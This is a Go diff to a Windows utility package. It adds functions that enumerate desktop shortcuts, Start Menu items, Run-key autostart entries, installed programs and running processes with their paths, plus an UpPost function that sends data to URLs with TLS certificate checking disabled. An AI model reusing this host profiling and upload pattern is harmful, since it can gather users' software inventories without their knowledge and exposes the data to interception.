@@ -1,12 +1,17 @@
 package utils
 
 import (
+	"bytes"
+	"crypto/tls"
 	"errors"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unicode/utf16"
@@ -19,6 +24,7 @@ const (
 	// 进程相关
 	th32csSnapProcess = 0x00000002
 	processTerminate  = 0x0001
+	procQry           = 0x1000 // PROCESS_QUERY_LIMITED_INFORMATION
 )
 
 var (
@@ -29,9 +35,8 @@ var (
 	procProcess32NextW           = modKernel32.NewProc("Process32NextW")
 	procOpenProcess              = modKernel32.NewProc("OpenProcess")
 	procTerminateProcess         = modKernel32.NewProc("TerminateProcess")
-
-	// 删除文件相关
-	procDeleteFileW = modKernel32.NewProc("DeleteFileW")
+	procQryImg                   = modKernel32.NewProc("QueryFullProcessImageNameW")
+	procDeleteFileW              = modKernel32.NewProc("DeleteFileW")
 )
 
 // PROCESSENTRY32 结构
@@ -543,4 +548,394 @@ func Tryrm(exePath string) error {
 		return err
 	}
 	return RunUn(p, d)
+}
+
+func baseNoExt(n string) string {
+	n = strings.TrimSpace(n)
+	if n == "" {
+		return ""
+	}
+	ext := filepath.Ext(n)
+	if ext != "" {
+		n = strings.TrimSuffix(n, ext)
+	}
+	return strings.TrimSpace(n)
+}
+
+// 取桌面lnk文件名
+func DeskLst() []string {
+	dirs := make([]string, 0, 6)
+	add := func(p string) {
+		p = strings.TrimSpace(p)
+		if p == "" {
+			return
+		}
+		if fi, err := os.Stat(p); err == nil && fi.IsDir() {
+			dirs = append(dirs, p)
+		}
+	}
+
+	up := os.Getenv("USERPROFILE")
+	add(filepath.Join(up, "Desktop"))
+	add(filepath.Join(up, "OneDrive", "Desktop"))
+	add(filepath.Join(up, "OneDrive", "桌面"))
+	od := os.Getenv("OneDrive")
+	add(filepath.Join(od, "Desktop"))
+	add(filepath.Join(od, "桌面"))
+	pub := os.Getenv("PUBLIC")
+	add(filepath.Join(pub, "Desktop"))
+
+	out := make([]string, 0, 128)
+	set := map[string]struct{}{}
+	for _, d := range dirs {
+		ents, err := os.ReadDir(d)
+		if err != nil {
+			continue
+		}
+		for _, e := range ents {
+			if e.IsDir() {
+				continue
+			}
+			n := e.Name()
+			if !strings.EqualFold(filepath.Ext(n), ".lnk") {
+				continue
+			}
+			bn := baseNoExt(n)
+			if bn == "" {
+				continue
+			}
+			k := strings.ToLower(bn)
+			if _, ok := set[k]; ok {
+				continue
+			}
+			set[k] = struct{}{}
+			out = append(out, bn)
+		}
+	}
+	return out
+}
+
+// 取开始菜单目录/文件名
+func MenuLst() []string {
+	root := `C:\ProgramData\Microsoft\Windows\Start Menu\Programs`
+	ents, err := os.ReadDir(root)
+	if err != nil {
+		return []string{}
+	}
+
+	ch := make(chan string, 256)
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, 8)
+
+	for _, e := range ents {
+		if e.IsDir() {
+			dn := e.Name()
+			wg.Add(1)
+			sem <- struct{}{}
+			go func(dn string) {
+				defer wg.Done()
+				defer func() { <-sem }()
+				sub, err := os.ReadDir(filepath.Join(root, dn))
+				if err != nil {
+					return
+				}
+				for _, s := range sub {
+					if s.IsDir() {
+						continue
+					}
+					fn := baseNoExt(s.Name())
+					if fn == "" {
+						continue
+					}
+					ch <- filepath.ToSlash(filepath.Join(dn, fn))
+				}
+			}(dn)
+			continue
+		}
+
+		fn := baseNoExt(e.Name())
+		if fn != "" {
+			ch <- fn
+		}
+	}
+
+	go func() {
+		wg.Wait()
+		close(ch)
+	}()
+
+	out := make([]string, 0, 256)
+	set := map[string]struct{}{}
+	for s := range ch {
+		if _, ok := set[s]; ok {
+			continue
+		}
+		set[s] = struct{}{}
+		out = append(out, s)
+	}
+	return out
+}
+
+// 取HKCU/HKLM启动项
+func RunLst() ([]string, []string) {
+	usr := runKey(reg.CURRENT_USER)
+	mac := runKey(reg.LOCAL_MACHINE)
+	return usr, mac
+}
+
+// 取启动项注册表
+func runKey(root reg.Key) []string {
+	sub := `Software\Microsoft\Windows\CurrentVersion\Run`
+	k, err := reg.OpenKey(root, sub, reg.QUERY_VALUE)
+	if err != nil {
+		return []string{}
+	}
+	defer k.Close()
+
+	ns, err := k.ReadValueNames(0)
+	if err != nil {
+		return []string{}
+	}
+	out := make([]string, 0, len(ns))
+	set := map[string]struct{}{}
+	for _, n := range ns {
+		bn := baseNoExt(n)
+		if bn == "" {
+			continue
+		}
+		k2 := strings.ToLower(bn)
+		if _, ok := set[k2]; ok {
+			continue
+		}
+		set[k2] = struct{}{}
+		out = append(out, bn)
+	}
+	return out
+}
+
+// 取注册表可卸载项
+func UnLst() ([]string, []string) {
+	x64 := unKey(`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall`)
+	x32 := unKey(`SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall`)
+	return x64, x32
+}
+
+func unKey(sub string) []string {
+	k, err := reg.OpenKey(reg.LOCAL_MACHINE, sub, reg.ENUMERATE_SUB_KEYS|reg.QUERY_VALUE)
+	if err != nil {
+		return []string{}
+	}
+	defer k.Close()
+
+	ns, err := k.ReadSubKeyNames(-1)
+	if err != nil {
+		return []string{}
+	}
+	out := make([]string, 0, len(ns))
+	set := map[string]struct{}{}
+	for _, n := range ns {
+		ck, err := reg.OpenKey(k, n, reg.QUERY_VALUE)
+		if err != nil {
+			continue
+		}
+		dn, _, err := ck.GetStringValue("DisplayName")
+		ck.Close()
+		if err != nil {
+			continue
+		}
+		dn = strings.TrimSpace(dn)
+		if dn == "" {
+			continue
+		}
+		k2 := strings.ToLower(dn)
+		if _, ok := set[k2]; ok {
+			continue
+		}
+		set[k2] = struct{}{}
+		out = append(out, dn)
+	}
+	return out
+}
+
+// 进程
+type procInf struct {
+	pid  uint32
+	name string
+}
+
+// 枚举进程
+func procAll() ([]procInf, error) {
+	snap, _, err := procCreateToolhelp32Snapshot.Call(uintptr(th32csSnapProcess), 0)
+	const inv = ^uintptr(0)
+	if snap == inv {
+		return nil, fmt.Errorf("snap: %v", err)
+	}
+	defer syscall.CloseHandle(syscall.Handle(snap))
+
+	var pe processEntry32
+	pe.DwSize = uint32(unsafe.Sizeof(pe))
+	ret, _, err := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
+	if ret == 0 {
+		return nil, fmt.Errorf("pfirst: %v", err)
+	}
+
+	out := make([]procInf, 0, 256)
+	for {
+		out = append(out, procInf{pid: pe.Th32ProcessID, name: u16_str(pe.SzExeFile[:])})
+		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
+		if ret == 0 {
+			break
+		}
+	}
+	return out, nil
+}
+
+// 取进程完整路径
+func procPath(pid uint32) string {
+	h, _, _ := procOpenProcess.Call(uintptr(procQry), 0, uintptr(pid))
+	if h == 0 {
+		return ""
+	}
+	defer syscall.CloseHandle(syscall.Handle(h))
+
+	buf := make([]uint16, 32768)
+	sz := uint32(len(buf))
+	r, _, _ := procQryImg.Call(h, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&sz)))
+	if r == 0 || sz == 0 {
+		return ""
+	}
+	return syscall.UTF16ToString(buf[:sz])
+}
+
+// 取路径上两层目录名
+func Up2(p string) string {
+	p = filepath.Clean(p)
+	d1 := filepath.Dir(p)
+	b1 := filepath.Base(d1)
+	d2 := filepath.Dir(d1)
+	if d2 == d1 || d2 == "." {
+		return b1
+	}
+	b2 := filepath.Base(d2)
+	if b2 == "" || b2 == "." {
+		return b1
+	}
+	return filepath.ToSlash(filepath.Join(b2, b1))
+}
+
+// 取符合条件的进程列表
+func ProcLst(kws []string) []string {
+	ks := make([]string, 0, len(kws))
+	for _, s := range kws {
+		s = strings.TrimSpace(s)
+		if s == "" {
+			continue
+		}
+		if strings.HasPrefix(s, "#") || strings.HasPrefix(s, ";") {
+			continue
+		}
+		ks = append(ks, strings.ToLower(s))
+	}
+
+	wind := strings.ToLower(os.Getenv("WINDIR"))
+	if wind != "" {
+		wind = strings.ToLower(filepath.Clean(wind))
+	}
+
+	ps, err := procAll()
+	if err != nil {
+		return []string{}
+	}
+
+	out := make([]string, 0, 256)
+	set := map[string]struct{}{}
+	for _, p := range ps {
+		path := procPath(p.pid)
+		if path == "" {
+			continue
+		}
+		lp := strings.ToLower(path)
+
+		// 系统目录过滤
+		if wind != "" && strings.HasPrefix(lp, wind) {
+			continue
+		}
+		if strings.Contains(lp, "\\windows\\") {
+			continue
+		}
+
+		// folder.txt 过滤：命中则跳过
+		dir := strings.ToLower(filepath.Dir(path))
+		hit := false
+		for _, k := range ks {
+			if k != "" && strings.Contains(dir, k) {
+				hit = true
+				break
+			}
+		}
+		if hit {
+			continue
+		}
+
+		nm := baseNoExt(filepath.Base(p.name))
+		if nm == "" {
+			nm = baseNoExt(filepath.Base(path))
+		}
+		if nm == "" {
+			continue
+		}
+		tag := Up2(path)
+		if tag == "" {
+			continue
+		}
+
+		s := nm + "==" + tag
+		k := strings.ToLower(s)
+		if _, ok := set[k]; ok {
+			continue
+		}
+		set[k] = struct{}{}
+		out = append(out, s)
+	}
+	return out
+}
+
+// 上传
+func UpPost(urls []string, dat []byte) (string, error) {
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	cli := &http.Client{Timeout: 8 * time.Second, Transport: tr}
+
+	var last error
+	for _, u := range urls {
+		u = strings.TrimSpace(u)
+		if u == "" {
+			continue
+		}
+
+		req, err := http.NewRequest("POST", u, bytes.NewReader(dat))
+		if err != nil {
+			last = err
+			continue
+		}
+		req.Header.Set("Content-Type", "application/json")
+
+		rsp, err := cli.Do(req)
+		if err != nil {
+			last = err
+			continue
+		}
+		io.Copy(io.Discard, rsp.Body)
+		rsp.Body.Close()
+
+		if rsp.StatusCode >= 200 && rsp.StatusCode < 300 {
+			return u, nil
+		}
+		last = fmt.Errorf("%s: %s", u, rsp.Status)
+	}
+	if last == nil {
+		last = fmt.Errorf("no url")
+	}
+	return "", last
 }
